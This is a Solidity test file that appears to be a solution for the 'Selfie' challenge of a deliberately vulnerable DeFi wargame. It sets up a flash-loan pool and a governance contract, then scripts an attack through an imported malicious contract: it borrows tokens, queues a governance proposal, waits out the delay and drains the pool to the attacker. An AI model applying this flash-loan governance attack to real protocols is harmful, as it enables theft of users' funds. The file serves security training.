// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.10;

import "../BaseTest.sol";
import "../../DamnValuableTokenSnapshot.sol";
import "../../selfie/SelfiePool.sol";
import "../../selfie/SimpleGovernance.sol";
import "../../selfie/MaliciousContractSelfie.sol";

contract Selfie is BaseTest {
    uint TOKENS_IN_POOL = 1500000 ether;
    uint TOKEN_INITIAL_SUPPLY = 2000000 ether;

    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    MaliciousContractSelfie maliciousContractSelfie;
    DamnValuableTokenSnapshot liquidityToken;

    address attacker;

    constructor() {
        string[] memory labels = new string[](1);
        labels[0] = "Attacker";
        preSetup(1, labels);
    }

    function setUp() public override {
        super.setUp();
        attacker = users[0];

        // Create liquidityToken
        liquidityToken = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        // Create gov
        simpleGovernance = new SimpleGovernance(address(liquidityToken));
        // Create pool
        selfiePool = new SelfiePool(address(liquidityToken), address(simpleGovernance));
        liquidityToken.transfer(address(selfiePool), TOKENS_IN_POOL);

        // Create maliciousContract
        vm.prank(attacker);
        maliciousContractSelfie = new MaliciousContractSelfie(
            address(selfiePool),
            address(liquidityToken),
            address(simpleGovernance));

        assertEq(liquidityToken.balanceOf(address(selfiePool)), TOKENS_IN_POOL);
    }

    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */
        // Attack, get flashLoan an create a proposal in the gov, then return the flashLoan
        vm.startPrank(attacker);
        maliciousContractSelfie.attack();
        // Jump another 3 days in order to pass the ACTION_DELAY_IN_SECONDS
        utils.mineTime(3 days);
        // Execute the proposal
        maliciousContractSelfie.drainToAttacker();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */
        // Attacker now has the TOKENS_IN_POOL
        assertEq(liquidityToken.balanceOf(address(attacker)), TOKENS_IN_POOL);
        // The pool is drained
        assertEq(liquidityToken.balanceOf(address(selfiePool)), 0);
    }
}